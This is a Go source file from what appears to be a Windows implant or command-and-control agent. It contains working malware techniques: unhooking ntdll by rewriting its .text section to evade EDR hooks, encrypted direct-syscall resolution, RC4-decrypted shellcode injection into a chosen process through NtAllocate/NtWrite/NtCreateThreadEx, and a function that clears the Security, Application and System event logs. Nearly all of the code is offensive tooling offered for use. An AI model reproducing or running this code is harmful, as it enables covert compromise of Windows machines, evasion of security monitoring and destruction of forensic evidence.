package sysutils

import (
	"crypto/rc4"
	"debug/pe"
	"fmt"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/kensh1ro/willie/config"
	"github.com/kensh1ro/willie/hgsyscall"
	"github.com/kensh1ro/willie/winapi"
	"golang.org/x/sys/windows"
)

func CheckMutex() bool {
	err := winapi.CreateMutex(syscall.StringToUTF16Ptr(config.MUTEX_STRING))
	switch int(err.(syscall.Errno)) {
	case 0:
		return false
	default:
		return true
	}
}

func UnhookDLL(name string) {
	var (
		//	ProcHandle uint16
		oldprotect uint32
	)
	ntprotect, err := hgsyscall.GetSysIDFromDisk(config.Decrypt(config.NTPROTECTVIRTUAL))
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	ntwrite, err := hgsyscall.GetSysIDFromDisk(config.Decrypt(config.NTWRITEVIRTUAL))
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	DLL, err := os.ReadFile(name)
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	PE, err := pe.Open(name)
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	text_section := PE.Section(".text")
	text_data := DLL[text_section.Offset:text_section.Size]
	new_dll, err := windows.LoadDLL(name)
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	hDLL := new_dll.Handle
	dllBase := uintptr(hDLL)
	offset := uint(dllBase) + uint(text_section.VirtualAddress)
	data_len := uintptr(len(text_data))
	current_thread := uintptr(0xffffffffffffffff)
	ret := hgsyscall.Syscall(
		ntprotect,
		uintptr(current_thread),
		uintptr(unsafe.Pointer(&offset)),
		uintptr(unsafe.Pointer(&data_len)),
		syscall.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldprotect)),
	)

	if ret != 0 {
		fmt.Println(ret)

		return
	}

	/*for i := 0; i < len(text_data); i++ {
		base := uintptr(offset + uint(i))
		mem := (*[1]byte)(unsafe.Pointer(base))
		(*mem)[0] = text_data[i]
	}*/

	ret = hgsyscall.Syscall(
		ntwrite,
		uintptr(current_thread),
		uintptr(offset),
		uintptr(unsafe.Pointer(&text_data[0])),
		uintptr(len(text_data)),
		0,
	)
	if ret != 0 {
		fmt.Printf("Write status is %d\n", ret)

		return
	}
	ret = hgsyscall.Syscall(
		ntprotect,
		uintptr(current_thread),
		uintptr(unsafe.Pointer(&offset)),
		uintptr(unsafe.Pointer(&data_len)),
		uintptr(oldprotect),
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if ret != 0 {
		fmt.Println(ret)

		return
	}
}

// !inject -p pid -e key -t time
func InjectionHandler(command string, payload []byte) string {
	var (
		time int    = 60
		pid  int    = 0
		key  string = ""
	)
	if command == "" {
		go Inject(payload, pid, key, time)
		return "[+] Executed"
	} else {
		tokens := strings.Split(command, " ")
		if len(tokens)%2 == 0 {
			for i, t := range tokens {
				if t == "-pid" {
					pid, _ = strconv.Atoi(tokens[i+1])
				} else if t == "-t" {
					time, _ = strconv.Atoi(tokens[i+1])
				} else if t == "-e" {
					key = tokens[i+1]
				}
			}
			go Inject(payload, pid, key, time)
			return "[+] Executed"
		}
	}
	return "Error parsing arguments"
}

func Inject(shellcode []byte, pid int, rc4key string, sleep int) string {
	var pHandle uintptr
	if pid != 0 {
		p, e := windows.OpenProcess(uint32(0x1F0FFF), false, uint32(pid))
		if e != nil {
			return "Error opening process"
		}
		pHandle = uintptr(p)
	} else {
		pHandle = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
	}
	var regionsize uintptr
	var data []byte
	if rc4key != "" {
		data = make([]byte, len(shellcode))
		cipher, _ := rc4.NewCipher([]byte(rc4key))
		cipher.XORKeyStream(data, shellcode)
		regionsize = uintptr(len(data))
	} else {
		regionsize = uintptr(len(shellcode))
	}
	alloc, e := hgsyscall.GetSysIDFromDisk(config.Decrypt((config.NTALLOCATEVIRTUAL)))
	if e != nil {
		return e.Error()
	}
	protect, e := hgsyscall.GetSysIDFromDisk(config.Decrypt((config.NTPROTECTVIRTUAL)))
	if e != nil {
		return e.Error()
	}
	ntwrite, e := hgsyscall.GetSysIDFromDisk(config.Decrypt(config.NTWRITEVIRTUAL))
	if e != nil {
		return e.Error()
	}
	createthread, e := hgsyscall.GetSysIDFromDisk(config.Decrypt((config.NTCREATETHREAD)))
	if e != nil {
		return e.Error()
	}

	var baseA uintptr
	hgsyscall.Syscall(
		alloc,
		pHandle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		windows.PAGE_READWRITE,
	)

	hgsyscall.Syscall(
		alloc,
		pHandle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		windows.PAGE_READWRITE,
	)
	if rc4key != "" {
		//hgsyscall.WriteMemory(data, baseA)
		hgsyscall.Syscall(
			ntwrite,
			pHandle,
			uintptr(baseA),
			uintptr(unsafe.Pointer(&data[0])),
			uintptr(len(data)),
			0,
		)
	} else {
		//hgsyscall.WriteMemory(shellcode, baseA)
		hgsyscall.Syscall(
			ntwrite,
			pHandle,
			uintptr(baseA),
			uintptr(unsafe.Pointer(&shellcode[0])),
			uintptr(len(shellcode)),
			0,
		)
	}
	var oldprotect uintptr
	hgsyscall.Syscall(
		protect,
		pHandle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)

	if sleep != 0 {
		time.Sleep(time.Second * time.Duration(sleep))
	}

	var hThread uintptr
	hgsyscall.Syscall(
		createthread,                      //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hThread)), //hthread
		0x1FFFFF,                          //desiredaccess
		0,                                 //objattributes
		pHandle,                           //processhandle
		baseA,                             //lpstartaddress
		0,                                 //lpparam
		uintptr(0),                        //createsuspended
		0,                                 //zerobits
		0,                                 //sizeofstackcommit
		0,                                 //sizeofstackreserve
		0,                                 //lpbytesbuffer
	)
	syscall.WaitForSingleObject(syscall.Handle(hThread), 0xffffffff)
	return "[+] Thread finished"
}

func ClearEv() string {
	var numRecords uint32
	var builder strings.Builder
	logs := [3]string{"Security", "Application", "System"}
	for _, l := range logs {
		hEvent := winapi.OpenEventLog(syscall.StringToUTF16Ptr(l))
		if hEvent == 0 {
			return "Requires administrator privileges"
		}
		winapi.GetNumberOfEventLogRecords(hEvent, &numRecords)
		winapi.ClearEventLog(hEvent)
		winapi.CloseEventLog(hEvent)
		builder.WriteString(fmt.Sprintf("Clearing %d from %s\n", numRecords, l))
	}
	return builder.String()
}

func Uptime() string {
	return fmt.Sprintf("System uptime: %s", windows.DurationSinceBoot())
}
